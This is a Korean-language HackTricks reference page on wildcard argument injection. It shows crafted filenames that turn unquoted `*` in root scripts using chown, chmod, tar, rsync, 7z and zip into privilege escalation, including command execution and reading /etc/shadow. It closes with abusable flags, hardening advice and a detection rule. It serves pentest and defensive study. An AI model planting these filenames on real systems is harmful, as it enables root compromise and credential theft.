# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> 와일드카드(일명 *glob*) **인수 주입**은 특권 스크립트가 `tar`, `chown`, `rsync`, `zip`, `7z`와 같은 Unix 바이너리를 인용되지 않은 와일드카드 `*`와 함께 실행할 때 발생합니다.
> 셸이 바이너리를 실행하기 **전에** 와일드카드를 확장하기 때문에, 작업 디렉토리에 파일을 생성할 수 있는 공격자는 `-`로 시작하는 파일 이름을 만들어 이를 **데이터가 아닌 옵션**으로 해석되도록 하여 임의의 플래그나 심지어 명령을 밀어넣을 수 있습니다.
> 이 페이지는 2023-2025년을 위한 가장 유용한 원시 요소, 최근 연구 및 현대 탐지를 수집합니다.

## chown / chmod

`--reference` 플래그를 악용하여 **임의 파일의 소유자/그룹 또는 권한 비트를 복사할 수 있습니다**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
루트가 나중에 다음과 같은 것을 실행할 때:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file`가 주입되어, *모든* 일치하는 파일이 `/root/secret``file`의 소유권/권한을 상속받습니다.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (결합 공격).
자세한 내용은 고전 DefenseCode 논문을 참조하십시오.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** 기능을 악용하여 임의의 명령을 실행합니다:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
루트가 예를 들어 `tar -czf /root/backup.tgz *`를 실행하면, `shell.sh`가 루트로 실행됩니다.

### bsdtar / macOS 14+

최근 macOS의 기본 `tar`( `libarchive` 기반)는 `--checkpoint`를 구현하지 않지만, 외부 압축기를 지정할 수 있는 **--use-compress-program** 플래그를 사용하여 여전히 코드 실행을 달성할 수 있습니다.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
특권 스크립트가 `tar -cf backup.tar *`를 실행하면 `/bin/sh`가 시작됩니다.

---

## rsync

`rsync`는 `-e` 또는 `--rsync-path`로 시작하는 명령줄 플래그를 통해 원격 셸 또는 원격 바이너리를 재정의할 수 있게 해줍니다:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
루트가 나중에 `rsync -az * backup:/srv/`로 디렉토리를 아카이브하면, 주입된 플래그가 원격 측에서 당신의 셸을 생성합니다.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` 모드).

---

## 7-Zip / 7z / 7za

특권 스크립트가 와일드카드를 `--`로 *방어적으로* 접두사 붙여서 옵션 파싱을 중지하더라도, 7-Zip 형식은 파일 이름을 `@`로 접두사 붙여 **파일 목록 파일**을 지원합니다. 이를 심볼릭 링크와 결합하면 *임의 파일을 유출할 수 있습니다*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
루트가 다음과 같은 것을 실행하면:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip는 `root.txt` (→ `/etc/shadow`)를 파일 목록으로 읽으려고 시도하며, **stderr에 내용을 출력하며 중단합니다**.

---

## zip

`zip`는 아카이브가 테스트될 때 시스템 셸에 *그대로* 전달되는 `--unzip-command` 플래그를 지원합니다:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## 추가 바이너리: 와일드카드 주입에 취약한 (2023-2025 빠른 목록)

다음 명령어는 현대 CTF와 실제 환경에서 악용되었습니다. 페이로드는 항상 와일드카드로 처리될 수 있는 쓰기 가능한 디렉토리 내의 *파일 이름*으로 생성됩니다:

| 바이너리 | 악용할 플래그 | 효과 |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → 임의의 `@file` | 파일 내용 읽기 |
| `flock` | `-c <cmd>` | 명령 실행 |
| `git`   | `-c core.sshCommand=<cmd>` | SSH를 통한 git의 명령 실행 |
| `scp`   | `-S <cmd>` | ssh 대신 임의의 프로그램 실행 |

이러한 원시 명령어는 *tar/rsync/zip* 고전보다 덜 일반적이지만, 사냥할 때 확인할 가치가 있습니다.

---

## 탐지 및 강화

1. **중요 스크립트에서 셸 글로빙 비활성화**: `set -f` (`set -o noglob`)는 와일드카드 확장을 방지합니다.
2. **인수 인용 또는 이스케이프**: `tar -czf "$dst" -- *`는 *안전하지 않습니다* — `find . -type f -print0 | xargs -0 tar -czf "$dst"`를 선호합니다.
3. **명시적 경로**: 공격자가 `-`로 시작하는 형제 파일을 생성할 수 없도록 `*` 대신 `/var/www/html/*.log`를 사용합니다.
4. **최소 권한**: 가능한 경우 루트 대신 비특권 서비스 계정으로 백업/유지 관리 작업을 실행합니다.
5. **모니터링**: Elastic의 사전 구축된 규칙 *Potential Shell via Wildcard Injection*은 `tar --checkpoint=*`, `rsync -e*`, 또는 `zip --unzip-command` 다음에 즉시 셸 자식 프로세스를 찾습니다. EQL 쿼리는 다른 EDR에 맞게 조정할 수 있습니다.

---

## 참조

* Elastic Security – Potential Shell via Wildcard Injection Detected rule (최종 업데이트 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (2024년 12월 18일)

{{#include ../../banners/hacktricks-training.md}}
